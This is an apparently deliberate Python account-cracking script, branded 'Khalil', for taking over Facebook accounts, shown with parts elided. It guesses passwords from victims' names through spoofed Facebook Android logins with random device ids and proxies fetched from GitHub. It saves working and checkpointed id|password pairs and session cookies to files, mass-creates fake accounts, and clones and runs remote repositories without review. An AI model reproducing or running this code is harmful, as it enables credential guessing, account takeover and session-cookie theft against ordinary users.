...
try:
    prox= requests.get('https://raw.githubusercontent.com/MUGHAL-XD/dod/main/Review/prox.txt').text
...
sys.stdout.write('\x1b]2; Khalil 28 \x07')
logo=(f"""
/$$   /$$ /$$                 /$$ /$$ /$$      
| $$  /$$/| $$                | $$|__/| $$      
| $$ /$$/ | $$$$$$$   /$$$$$$ | $$ /$$| $$      
...
def api1(ids,names,passlist):
        try:
            global ok,loop
            sys.stdout.write('\r\r\033[1;37m [Khalil-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
            ...
            for pw in passlist:
                ...
                ua_string = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/238.0.0.13.171;FBBV/39997698;FBDM/{density=3.8,width=1200,height=1821};FBLC/en_US;FBRV/77723691;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G975F;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:;]"
                li = ['28','29','210']
                ...
                q = json.loads(po)
                if 'session_key' in q:
                    print('\r\r\033[1;32m [Khalil-OK] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/28/Khalil-OK.txt','a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    if 'y' in pcp:
                        print('\r\r\x1b[38;5;205m [Khalil-CP] '+ids+' | '+pas+'\033[1;97m')
                        open('/sdcard/28/Khalil-CP.txt','a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                        break
                    else:
                        open('/sdcard/28/Khalil-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [Khalil-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/238.0.0.13.171;FBBV/39997698;FBDM/{density=3.8,width=1200,height=1821};FBLC/en_US;FBRV/77723691;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G975F;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:;]"
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/28/Khalil-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/28/Khalil-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/238.0.0.13.171;FBBV/39997698;FBDM/{density=3.8,width=1200,height=1821};FBLC/en_US;FBRV/77723691;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G975F;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [Khalil-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                    
                                        open('/sdcard/28/rndm-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/28/rndm-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [Khalil-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/28/Khalil-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def Create():
    ...
    def strt():
       try:
           ...
           import sys
           loop+=1
           sys.stdout.write(f'\r\r\033[1;37m [Khalil-CREATE] OK:%s \033[1;37m'%(ok));sys.stdout.flush()
           requests=r.Session()
           from fake_email import Email
           mmail=Email().Mail()
           em=mmail['mail']
           ...
           if "9":
              ...
              if requests=="chk":
                ...
                pass
                 ...
                 print("\r\r\033[1;32m [Khalil-OK] "+uid+'|'+pas+'|'+coki)
                 linex()
                 ok+=1
                 open("/sdcard/Khalil/AUTO-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
...
def createip():
	...
	os.system('cd && cd YOUSIF16 ;python IKhalil.py')
#####_____END_____#####


#####_____Create-File_____#####
def create():
	os.system("cd && git clone --depth=1 https://github.com/Hannan-404/Khalil")
	os.system('cd && cd FILE ;python Khalil.py')
#####_____END_____#####
...
def main_apv():
    ...
    print(logo)
    try:
        key1 = open('/sdcard/Khalil.key.txt', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
        ...
        kok = open('/sdcard/Khalil.key.txt', 'w')
        kok.write(myid + imt)
        kok.close()
    
        #input(' Exit And Again Run The Command');os.system('python Khalil.py')
    ...
    r1 = requests.get('https://t.me/JokerB28').text
    ...
    if key1 in r1:
        ...
        tks = ('Hello%20MAFIA%20Owner%20YOUSIF%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://t.me/JokerB28='+tks)
        main_apv()
menu()
